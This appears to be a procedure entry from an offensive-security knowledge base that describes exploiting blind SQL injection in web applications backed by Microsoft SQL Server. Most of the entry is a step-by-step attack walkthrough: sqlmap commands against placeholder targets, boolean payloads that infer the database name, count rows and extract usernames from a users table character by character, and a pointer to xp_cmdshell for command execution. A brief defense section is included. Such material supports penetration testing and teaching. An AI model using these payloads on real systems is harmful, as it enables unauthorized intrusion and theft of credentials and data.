---
type: procedure
description: >-
  Exploit blind SQL injection vulnerabilities in MSSQL databases to extract
  sensitive information without direct output feedback.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - mssql
  - sql-injection
  - blind-injection
commands:
  - '[[commands/sqlmap-mssql-blind]]'
platforms:
  - Windows
  - Web
tools:
  - '[[tools/sqlmap]]'
validated: true
---

# MSSQL-Blind-SQL-Injection

## Summary

MSSQL Blind SQL Injection is a technique to exploit vulnerabilities in web applications connected to Microsoft SQL Server databases, allowing attackers to infer and extract sensitive data such as usernames, passwords, or database structures without receiving direct query results. By observing application behavior changes (e.g., true/false responses), attackers systematically guess data character by character or field by field.

## Description

This procedure targets input fields in web applications that fail to sanitize user input, enabling injection of SQL payloads into MSSQL queries. Unlike error-based or union-based injections, blind variants provide no visible output, requiring boolean (true/false) or time-based (delays) inference methods. Common in legacy applications or misconfigured APIs, this can lead to data exfiltration, authentication bypass, or command execution if privileges allow. The target environment is typically a web app with MSSQL backend, accessible over HTTP/HTTPS. Success relies on identifying injectable points and crafting payloads that alter app behavior predictably.

## Requirements

1. Access to a vulnerable web application with an MSSQL database backend (e.g., via browser or proxy like Burp Suite).
2. Knowledge of the injection point (e.g., login form, search field) and basic SQL syntax.
3. Tools such as SQLMap for automated testing or a proxy for manual injection.
4. Patience for iterative guessing, as extraction can be time-consuming.

## Defense

- Implement parameterized queries or prepared statements to separate code from data.
- Apply input validation and sanitization to reject malicious payloads.
- Use a Web Application Firewall (WAF) to detect and block injection attempts.
- Enforce least privilege on database accounts to limit damage from successful injections.
- Enable database logging and monitor for anomalous query patterns.

## Objectives

1. Confirm the presence of a blind SQL injection vulnerability.
2. Extract database metadata, such as names and versions.
3. Dump sensitive data like user credentials or table contents.
4. Potentially escalate to command execution if sa privileges are obtained.

## Instructions

### Step 1: Identify and Confirm Injection Point

**Context**: Locate a parameter vulnerable to SQL injection and verify it's blind by testing payloads that change application behavior without errors or data dumps.

Use a proxy tool to intercept requests and append a basic boolean payload like ' AND 1=1 --' to see if the response differs from ' AND 1=2 --' (true vs. false).

**Command** ([[commands/sqlmap-mssql-blind]]):
```bash
sqlmap -u "http://target.com/login.php" --dbms=mssql --technique=B --batch
```

This automates detection; for manual, craft payloads in the proxy. Expected behavior: Normal response for true condition, altered (e.g., error page or delay) for false.

### Step 2: Enumerate Database Information

**Context**: Use boolean conditions to guess database details like name, version, or structure, starting with length and character checks.

Inject payloads from [[codes/MSSQL-Blind-Injection-Queries]] to check lengths and ASCII values iteratively (e.g., binary search for characters).

For example, to check database name length:
```sql
AND LEN(DB_NAME())=5
```

Vary the number until true. Then extract characters:
```sql
AND ASCII(SUBSTRING(DB_NAME(),1,1))=97
```

Repeat for each position. Expected: Application responds differently based on true/false, allowing inference.

### Step 3: Extract Table Data

**Context**: Once metadata is known, target specific tables (e.g., users) to dump data field by field using similar boolean logic.

Assume a users table; check row count:
```sql
AND (SELECT COUNT(*) FROM tblusers)>0
```

Then extract username:
```sql
AND ASCII(SUBSTRING((SELECT TOP 1 username FROM tblusers),1,1))=97
```

Iterate over rows and characters. For automation, use SQLMap with dump option after confirmation.

**Command** ([[commands/sqlmap-mssql-blind]]):
```bash
sqlmap -u "http://target.com/vuln.php?id=1" --dbms=mssql --technique=B --dump -T tblusers
```

Expected: Gradual revelation of data through response patterns; full dump if automated.

### Step 4: Verify and Escalate if Possible

**Context**: Confirm extracted data and attempt privilege escalation or code execution.

Test version-specific payloads:
```sql
SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'
```

If high privileges, try xp_cmdshell for RCE. Success: Valid data extracted; escalation if commands execute.
